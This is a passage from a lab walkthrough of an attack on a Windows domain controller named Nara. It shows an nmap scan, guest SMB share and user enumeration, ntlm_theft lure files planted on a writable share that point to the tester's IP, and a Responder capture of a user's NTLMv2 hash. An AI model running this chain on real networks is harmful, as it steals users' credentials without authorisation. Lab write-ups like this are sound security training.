+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-13 19:30:22Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-13T19:32:02+00:00; +3s from scanner time.
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:Nara.nara-security.com
+| Not valid before: 2023-07-30T14:09:26
+|_Not valid after:  2024-07-29T14:09:26
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-13T19:32:02+00:00; +3s from scanner time.
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:Nara.nara-security.com
+| Not valid before: 2023-07-30T14:09:26
+|_Not valid after:  2024-07-29T14:09:26
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:Nara.nara-security.com
+| Not valid before: 2023-07-30T14:09:26
+|_Not valid after:  2024-07-29T14:09:26
+|_ssl-date: 2026-03-13T19:32:02+00:00; +3s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: nara-security.com, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-13T19:32:02+00:00; +3s from scanner time.
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:Nara.nara-security.com
+| Not valid before: 2023-07-30T14:09:26
+|_Not valid after:  2024-07-29T14:09:26
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=Nara.nara-security.com
+| Not valid before: 2026-03-12T19:27:29
+|_Not valid after:  2026-09-11T19:27:29
+| rdp-ntlm-info: 
+|   Target_Name: NARASEC
+|   NetBIOS_Domain_Name: NARASEC
+|   NetBIOS_Computer_Name: NARA
+|   DNS_Domain_Name: nara-security.com
+|   DNS_Computer_Name: Nara.nara-security.com
+|   DNS_Tree_Name: nara-security.com
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-03-13T19:31:22+00:00
+|_ssl-date: 2026-03-13T19:32:02+00:00; +3s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49686/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+49704/tcp open  msrpc         Microsoft Windows RPC
+49707/tcp open  msrpc         Microsoft Windows RPC
+49738/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 4 hops
+Service Info: Host: NARA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 2s, deviation: 0s, median: 2s
+| smb2-time: 
+|   date: 2026-03-13T19:31:26
+|_  start_date: N/A
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT     ADDRESS
+1   6.64 ms 192.168.45.1
+2   6.59 ms 192.168.45.254
+3   6.69 ms 192.168.251.1
+4   6.67 ms 192.168.175.30
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 215.45 seconds</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc smb 192.168.175.30                           
+SMB         192.168.175.30  445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Nara]</span>
+&boxur;&boxh;$ nxc smb <span class="hljs-number">192.168</span><span class="hljs-selector-class">.175</span><span class="hljs-selector-class">.30</span>                           
+SMB         <span class="hljs-number">192.168</span><span class="hljs-selector-class">.175</span><span class="hljs-selector-class">.30</span>  <span class="hljs-number">445</span>    NARA             <span class="hljs-selector-attr">[*]</span> Windows Server <span class="hljs-number">2022</span> Build <span class="hljs-number">20348</span> x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc smb 192.168.175.30 -u guest -p &apos;&apos; --shares
+SMB         192.168.175.30  445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.175.30  445    NARA             [+] nara-security.com\guest: 
+SMB         192.168.175.30  445    NARA             [*] Enumerated shares
+SMB         192.168.175.30  445    NARA             Share           Permissions     Remark
+SMB         192.168.175.30  445    NARA             -----           -----------     ------
+SMB         192.168.175.30  445    NARA             ADMIN$                          Remote Admin
+SMB         192.168.175.30  445    NARA             C$                              Default share
+SMB         192.168.175.30  445    NARA             IPC$            READ            Remote IPC
+SMB         192.168.175.30  445    NARA             nara            READ,WRITE      company share
+SMB         192.168.175.30  445    NARA             NETLOGON                        Logon server share 
+SMB         192.168.175.30  445    NARA             SYSVOL                          Logon server share</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc smb 192.168.175.30 -u guest -p &apos;&apos; --shares
+SMB         192.168.175.30  445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.175.30  445    NARA             [+] nara-security.com\guest: 
+SMB         192.168.175.30  445    NARA             [*] Enumerated shares
+SMB         192.168.175.30  445    NARA             Share           Permissions     Remark
+SMB         192.168.175.30  445    NARA             -----           -----------     ------
+SMB         192.168.175.30  445    NARA             ADMIN$                          Remote Admin
+SMB         192.168.175.30  445    NARA             C$                              Default share
+SMB         192.168.175.30  445    NARA             IPC$            READ            Remote IPC
+SMB         192.168.175.30  445    NARA             nara            READ,WRITE      company share
+SMB         192.168.175.30  445    NARA             NETLOGON                        Logon server share 
+SMB         192.168.175.30  445    NARA             SYSVOL                          Logon server share</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc smb 192.168.175.30 -u guest -p &apos;&apos; --rid-brute 10000
+SMB         192.168.175.30  445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.175.30  445    NARA             [+] nara-security.com\guest: 
+SMB         192.168.175.30  445    NARA             498: NARASEC\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             500: NARASEC\Administrator (SidTypeUser)
+SMB         192.168.175.30  445    NARA             501: NARASEC\Guest (SidTypeUser)
+SMB         192.168.175.30  445    NARA             502: NARASEC\krbtgt (SidTypeUser)
+SMB         192.168.175.30  445    NARA             512: NARASEC\Domain Admins (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             513: NARASEC\Domain Users (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             514: NARASEC\Domain Guests (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             515: NARASEC\Domain Computers (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             516: NARASEC\Domain Controllers (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             517: NARASEC\Cert Publishers (SidTypeAlias)
+SMB         192.168.175.30  445    NARA             518: NARASEC\Schema Admins (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             519: NARASEC\Enterprise Admins (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             520: NARASEC\Group Policy Creator Owners (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             521: NARASEC\Read-only Domain Controllers (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             522: NARASEC\Cloneable Domain Controllers (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             525: NARASEC\Protected Users (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             526: NARASEC\Key Admins (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             527: NARASEC\Enterprise Key Admins (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             553: NARASEC\RAS and IAS Servers (SidTypeAlias)
+SMB         192.168.175.30  445    NARA             571: NARASEC\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         192.168.175.30  445    NARA             572: NARASEC\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         192.168.175.30  445    NARA             1000: NARASEC\NARA$ (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1101: NARASEC\DnsAdmins (SidTypeAlias)
+SMB         192.168.175.30  445    NARA             1102: NARASEC\DnsUpdateProxy (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             1103: NARASEC\staff (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             1104: NARASEC\Amelia.O&apos;Brien (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1105: NARASEC\Damian.Johnson (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1106: NARASEC\Helen.Robinson (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1107: NARASEC\Sara.O&apos;Sullivan (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1108: NARASEC\Jasmine.Roberts (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1109: NARASEC\Declan.Reynolds (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1110: NARASEC\Jodie.Summers (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1111: NARASEC\Carolyn.Hill (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1112: NARASEC\Jemma.Humphries (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1113: NARASEC\Tracy.White (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1115: NARASEC\Remote Access (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             1116: NARASEC\Enrollment (SidTypeGroup)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc smb 192.168.175.30 -u guest -p &apos;&apos; --rid-brute 10000
+SMB         192.168.175.30  445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.175.30  445    NARA             [+] nara-security.com\guest: 
+SMB         192.168.175.30  445    NARA             498: NARASEC\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             500: NARASEC\Administrator (SidTypeUser)
+SMB         192.168.175.30  445    NARA             501: NARASEC\Guest (SidTypeUser)
+SMB         192.168.175.30  445    NARA             502: NARASEC\krbtgt (SidTypeUser)
+SMB         192.168.175.30  445    NARA             512: NARASEC\Domain Admins (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             513: NARASEC\Domain Users (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             514: NARASEC\Domain Guests (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             515: NARASEC\Domain Computers (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             516: NARASEC\Domain Controllers (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             517: NARASEC\Cert Publishers (SidTypeAlias)
+SMB         192.168.175.30  445    NARA             518: NARASEC\Schema Admins (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             519: NARASEC\Enterprise Admins (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             520: NARASEC\Group Policy Creator Owners (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             521: NARASEC\Read-only Domain Controllers (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             522: NARASEC\Cloneable Domain Controllers (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             525: NARASEC\Protected Users (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             526: NARASEC\Key Admins (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             527: NARASEC\Enterprise Key Admins (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             553: NARASEC\RAS and IAS Servers (SidTypeAlias)
+SMB         192.168.175.30  445    NARA             571: NARASEC\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         192.168.175.30  445    NARA             572: NARASEC\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         192.168.175.30  445    NARA             1000: NARASEC\NARA$ (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1101: NARASEC\DnsAdmins (SidTypeAlias)
+SMB         192.168.175.30  445    NARA             1102: NARASEC\DnsUpdateProxy (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             1103: NARASEC\staff (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             1104: NARASEC\Amelia.O&apos;Brien (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1105: NARASEC\Damian.Johnson (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1106: NARASEC\Helen.Robinson (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1107: NARASEC\Sara.O&apos;Sullivan (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1108: NARASEC\Jasmine.Roberts (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1109: NARASEC\Declan.Reynolds (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1110: NARASEC\Jodie.Summers (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1111: NARASEC\Carolyn.Hill (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1112: NARASEC\Jemma.Humphries (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1113: NARASEC\Tracy.White (SidTypeUser)
+SMB         192.168.175.30  445    NARA             1115: NARASEC\Remote Access (SidTypeGroup)
+SMB         192.168.175.30  445    NARA             1116: NARASEC\Enrollment (SidTypeGroup)</code></pre></div>
+<p>We have READ and WRITE privileges over the <code class="inline-code">nara</code> share on the DC. There is a file called <code class="inline-code">Important.txt</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ smbclient //192.168.175.30/nara -U nara-security.com/guest
+Password for [NARA-SECURITY.COM\guest]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Fri Mar 13 16:20:01 2026
+  ..                                DHS        0  Fri Mar 13 15:27:41 2026
+  Documents                           D        0  Sun Jul 30 10:03:13 2023
+  Important.txt                       A     2200  Sun Jul 30 10:05:31 2023
+  IT                                  D        0  Sun Jul 30 12:22:50 2023
+
+        7699711 blocks of size 4096. 4151289 blocks available
+smb: \&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ smbclient //192.168.175.30/nara -U nara-security.com/guest
+Password for [NARA-SECURITY.COM\guest]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D       <span class="hljs-number"> 0 </span> Fri Mar<span class="hljs-number"> 13 </span>16:20:01 2026
+  ..                                DHS       <span class="hljs-number"> 0 </span> Fri Mar<span class="hljs-number"> 13 </span>15:27:41 2026
+  Documents                           D       <span class="hljs-number"> 0 </span> Sun Jul<span class="hljs-number"> 30 </span>10:03:13 2023
+  Important.txt                       A    <span class="hljs-number"> 2200 </span> Sun Jul<span class="hljs-number"> 30 </span>10:05:31 2023
+  IT                                  D       <span class="hljs-number"> 0 </span> Sun Jul<span class="hljs-number"> 30 </span>12:22:50 2023
+
+       <span class="hljs-number"> 7699711 </span>blocks of size 4096.<span class="hljs-number"> 4151289 </span>blocks available
+smb: \&gt; 
+</code></pre></div>
+<p>Make a copy of all possible files using <code class="inline-code">ntlm_theft</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara/ntlm_theft]
+&boxur;&boxh;$ python3 ntlm_theft.py -f Contract -g all -s 192.168.45.217
+/home/kali/Desktop/Labs/Nara/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence &apos;\l&apos;
+  location.href = &apos;ms-word:ofe|u|\\&apos;&apos;&apos; + server + &apos;&apos;&apos;\leak\leak.docx&apos;;
+Created: Contract/Contract.scf (BROWSE TO FOLDER)
+Created: Contract/Contract-(url).url (BROWSE TO FOLDER)
+Created: Contract/Contract-(icon).url (BROWSE TO FOLDER)
+Created: Contract/Contract.lnk (BROWSE TO FOLDER)
+Created: Contract/Contract.rtf (OPEN)
+Created: Contract/Contract-(stylesheet).xml (OPEN)
+Created: Contract/Contract-(fulldocx).xml (OPEN)
+Created: Contract/Contract.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: Contract/Contract-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: Contract/Contract-(includepicture).docx (OPEN)
+Created: Contract/Contract-(remotetemplate).docx (OPEN)
+Created: Contract/Contract-(frameset).docx (OPEN)
+Created: Contract/Contract-(externalcell).xlsx (OPEN)
+Created: Contract/Contract.wax (OPEN)
+Created: Contract/Contract.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: Contract/Contract.asx (OPEN)
+Created: Contract/Contract.jnlp (OPEN)
+Created: Contract/Contract.application (DOWNLOAD AND OPEN)
+Created: Contract/Contract.pdf (OPEN AND ALLOW)
+Created: Contract/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: Contract/Contract.library-ms (BROWSE TO FOLDER)
+Created: Contract/Autorun.inf (BROWSE TO FOLDER)
+Created: Contract/desktop.ini (BROWSE TO FOLDER)
+Created: Contract/Contract.theme (THEME TO INSTALL
+Generation Complete.</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara/ntlm_theft]
+&boxur;&boxh;$ python3 ntlm_theft.py -f Contract -g all -s 192.168.45.217
+/home/kali/Desktop/Labs/Nara/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence &apos;\l&apos;
+  location.href = &apos;ms-word:ofe|u|\\&apos;&apos;&apos; + server + &apos;&apos;&apos;\leak\leak.docx&apos;;
+Created: Contract/Contract.scf (BROWSE TO FOLDER)
+Created: Contract/Contract-(url).url (BROWSE TO FOLDER)
+Created: Contract/Contract-(icon).url (BROWSE TO FOLDER)
+Created: Contract/Contract.lnk (BROWSE TO FOLDER)
+Created: Contract/Contract.rtf (OPEN)
+Created: Contract/Contract-(stylesheet).xml (OPEN)
+Created: Contract/Contract-(fulldocx).xml (OPEN)
+Created: Contract/Contract.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: Contract/Contract-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: Contract/Contract-(includepicture).docx (OPEN)
+Created: Contract/Contract-(remotetemplate).docx (OPEN)
+Created: Contract/Contract-(frameset).docx (OPEN)
+Created: Contract/Contract-(externalcell).xlsx (OPEN)
+Created: Contract/Contract.wax (OPEN)
+Created: Contract/Contract.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: Contract/Contract.asx (OPEN)
+Created: Contract/Contract.jnlp (OPEN)
+Created: Contract/Contract.application (DOWNLOAD AND OPEN)
+Created: Contract/Contract.pdf (OPEN AND ALLOW)
+Created: Contract/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: Contract/Contract.library-ms (BROWSE TO FOLDER)
+Created: Contract/Autorun.inf (BROWSE TO FOLDER)
+Created: Contract/desktop.ini (BROWSE TO FOLDER)
+Created: Contract/Contract.theme (THEME TO INSTALL
+Generation Complete.</code></pre></div>
+<p>Upload all the files to the <code class="inline-code">Documents</code> share:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ smbclient //192.168.175.30/nara -U nara-security.com/guest
+Password for [NARA-SECURITY.COM\guest]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Fri Mar 13 16:20:01 2026
+  ..                                DHS        0  Fri Mar 13 15:27:41 2026
+  Documents                           D        0  Fri Mar 13 16:28:01 2026
+  Important.txt                       A     2200  Sun Jul 30 10:05:31 2023
+  IT                                  D        0  Fri Mar 13 16:30:40 2026
+
+        7699711 blocks of size 4096. 4150818 blocks available
+smb: \&gt; cd Documents
+smb: \Documents\&gt; dir
+  .                                   D        0  Fri Mar 13 16:28:01 2026
+  ..                                  D        0  Fri Mar 13 16:20:01 2026
+  Contract.pdf                        A      784  Fri Mar 13 16:28:01 2026
+
+        7699711 blocks of size 4096. 4150818 blocks available
+smb: \Documents\&gt; del Contract.pdf
+smb: \Documents\&gt; lcd ntlm_theft/
+smb: \Documents\&gt; lcd Contract/
+smb: \Documents\&gt; recurse on
+smb: \Documents\&gt; prompt off
+smb: \Documents\&gt; mput *
+putting file Contract-(remotetemplate).docx as \Documents\Contract-(remotetemplate).docx (59.4 kB/s) (average 59.4 kB/s)
+putting file Contract-(url).url as \Documents\Contract-(url).url (1.3 kB/s) (average 54.2 kB/s)
+putting file Contract.m3u as \Documents\Contract.m3u (1.8 kB/s) (average 51.3 kB/s)
+putting file Contract.theme as \Documents\Contract.theme (45.6 kB/s) (average 50.9 kB/s)
+putting file Contract-(externalcell).xlsx as \Documents\Contract-(externalcell).xlsx (116.8 kB/s) (average 56.4 kB/s)
+putting file Contract.jnlp as \Documents\Contract.jnlp (6.0 kB/s) (average 53.8 kB/s)
+putting file desktop.ini as \Documents\desktop.ini (1.7 kB/s) (average 51.5 kB/s)
+putting file Contract.asx as \Documents\Contract.asx (4.4 kB/s) (average 49.2 kB/s)
+putting file zoom-attack-instructions.txt as \Documents\zoom-attack-instructions.txt (4.0 kB/s) (average 47.4 kB/s)
+putting file Contract-(handler).htm as \Documents\Contract-(handler).htm (0.9 kB/s) (average 40.0 kB/s)
+putting file Contract-(stylesheet).xml as \Documents\Contract-(stylesheet).xml (5.2 kB/s) (average 38.8 kB/s)
+putting file Contract.application as \Documents\Contract.application (46.1 kB/s) (average 39.1 kB/s)
+putting file Contract.rtf as \Documents\Contract.rtf (2.6 kB/s) (average 37.5 kB/s)
+putting file Contract.pdf as \Documents\Contract.pdf (14.2 kB/s) (average 36.3 kB/s)
+putting file Contract.wax as \Documents\Contract.wax (2.1 kB/s) (average 35.3 kB/s)
+putting file Autorun.inf as \Documents\Autorun.inf (2.2 kB/s) (average 34.2 kB/s)
+putting file Contract-(frameset).docx as \Documents\Contract-(frameset).docx (221.9 kB/s) (average 41.8 kB/s)
+putting file Contract-(includepicture).docx as \Documents\Contract-(includepicture).docx (6.7 kB/s) (average 21.8 kB/s)
+putting file Contract.scf as \Documents\Contract.scf (0.2 kB/s) (average 18.8 kB/s)
+putting file Contract.lnk as \Documents\Contract.lnk (4.0 kB/s) (average 16.6 kB/s)
+putting file Contract-(fulldocx).xml as \Documents\Contract-(fulldocx).xml (328.2 kB/s) (average 34.5 kB/s)
+putting file Contract.library-ms as \Documents\Contract.library-ms (8.1 kB/s) (average 33.5 kB/s)
+putting file Contract-(icon).url as \Documents\Contract-(icon).url (0.9 kB/s) (average 32.6 kB/s)
+putting file Contract.htm as \Documents\Contract.htm (0.6 kB/s) (average 31.5 kB/s)
+smb: \Documents\&gt;</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ smbclient //192.168.175.30/nara -U nara-security.com/guest
+Password for [NARA-SECURITY.COM\guest]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Fri Mar 13 16:20:01 2026
+  ..                                DHS        0  Fri Mar 13 15:27:41 2026
+  Documents                           D        0  Fri Mar 13 16:28:01 2026
+  Important.txt                       A     2200  Sun Jul 30 10:05:31 2023
+  IT                                  D        0  Fri Mar 13 16:30:40 2026
+
+        7699711 blocks of size 4096. 4150818 blocks available
+smb: \&gt; cd Documents
+smb: \Documents\&gt; dir
+  .                                   D        0  Fri Mar 13 16:28:01 2026
+  ..                                  D        0  Fri Mar 13 16:20:01 2026
+  Contract.pdf                        A      784  Fri Mar 13 16:28:01 2026
+
+        7699711 blocks of size 4096. 4150818 blocks available
+smb: \Documents\&gt; del Contract.pdf
+smb: \Documents\&gt; lcd ntlm_theft/
+smb: \Documents\&gt; lcd Contract/
+smb: \Documents\&gt; recurse on
+smb: \Documents\&gt; prompt off
+smb: \Documents\&gt; mput *
+putting file Contract-(remotetemplate).docx as \Documents\Contract-(remotetemplate).docx (59.4 kB/s) (average 59.4 kB/s)
+putting file Contract-(url).url as \Documents\Contract-(url).url (1.3 kB/s) (average 54.2 kB/s)
+putting file Contract.m3u as \Documents\Contract.m3u (1.8 kB/s) (average 51.3 kB/s)
+putting file Contract.theme as \Documents\Contract.theme (45.6 kB/s) (average 50.9 kB/s)
+putting file Contract-(externalcell).xlsx as \Documents\Contract-(externalcell).xlsx (116.8 kB/s) (average 56.4 kB/s)
+putting file Contract.jnlp as \Documents\Contract.jnlp (6.0 kB/s) (average 53.8 kB/s)
+putting file desktop.ini as \Documents\desktop.ini (1.7 kB/s) (average 51.5 kB/s)
+putting file Contract.asx as \Documents\Contract.asx (4.4 kB/s) (average 49.2 kB/s)
+putting file zoom-attack-instructions.txt as \Documents\zoom-attack-instructions.txt (4.0 kB/s) (average 47.4 kB/s)
+putting file Contract-(handler).htm as \Documents\Contract-(handler).htm (0.9 kB/s) (average 40.0 kB/s)
+putting file Contract-(stylesheet).xml as \Documents\Contract-(stylesheet).xml (5.2 kB/s) (average 38.8 kB/s)
+putting file Contract.application as \Documents\Contract.application (46.1 kB/s) (average 39.1 kB/s)
+putting file Contract.rtf as \Documents\Contract.rtf (2.6 kB/s) (average 37.5 kB/s)
+putting file Contract.pdf as \Documents\Contract.pdf (14.2 kB/s) (average 36.3 kB/s)
+putting file Contract.wax as \Documents\Contract.wax (2.1 kB/s) (average 35.3 kB/s)
+putting file Autorun.inf as \Documents\Autorun.inf (2.2 kB/s) (average 34.2 kB/s)
+putting file Contract-(frameset).docx as \Documents\Contract-(frameset).docx (221.9 kB/s) (average 41.8 kB/s)
+putting file Contract-(includepicture).docx as \Documents\Contract-(includepicture).docx (6.7 kB/s) (average 21.8 kB/s)
+putting file Contract.scf as \Documents\Contract.scf (0.2 kB/s) (average 18.8 kB/s)
+putting file Contract.lnk as \Documents\Contract.lnk (4.0 kB/s) (average 16.6 kB/s)
+putting file Contract-(fulldocx).xml as \Documents\Contract-(fulldocx).xml (328.2 kB/s) (average 34.5 kB/s)
+putting file Contract.library-ms as \Documents\Contract.library-ms (8.1 kB/s) (average 33.5 kB/s)
+putting file Contract-(icon).url as \Documents\Contract-(icon).url (0.9 kB/s) (average 32.6 kB/s)
+putting file Contract.htm as \Documents\Contract.htm (0.6 kB/s) (average 31.5 kB/s)
+smb: \Documents\&gt;</code></pre></div>
+<p>Start up <code class="inline-code">responder</code> and we should successfully capture the NTLMv2 hash of user <code class="inline-code">tracy.white</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">[SMB] NTLMv2-SSP Client   : 192.168.175.30
+[SMB] NTLMv2-SSP Username : NARASEC\Tracy.White
